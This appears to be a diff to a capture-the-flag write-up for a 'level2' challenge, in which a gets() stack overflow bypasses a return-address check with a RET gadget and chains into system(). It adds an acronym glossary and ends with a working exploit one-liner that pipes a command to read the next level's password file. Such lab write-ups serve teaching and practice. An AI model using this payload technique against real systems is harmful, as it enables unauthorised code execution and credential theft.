@@ -1,5 +1,5 @@
 ## Level2 - Buffer Overflow with RET Gadget Chain Exploit
-Buffer overflow via gets(). Return address check blocks 0xb0xxxxxx range (libc). Bypass with RET gadget at 0x0804853e.
+Stack buffer overflow via gets() — return address check blocks libc range, bypassed with a RET gadget (0x0804853e) to chain into system()
 
 ### Settings
 GCC stack protector support:            Enabled
@@ -38,6 +38,15 @@ Jump to RET instruction at 0x0804853e:
 - **80 bytes** (not 76!) - 4 bytes padding between buffer and return address
 - **Newline after payload** - gets() reads until \n
 - First return validated, second jump (to system) not checked
+
+### Acronyms
+ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
+RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
+PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization
+RET    Return                              A CPU instruction that pops the return address off the stack and jumps to it; used here as a gadget to bypass the return address check
 
 ### Execution
 (python -c "print 'A'*80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7'"; echo "cat /home/user/level3/.pass") | ./level2
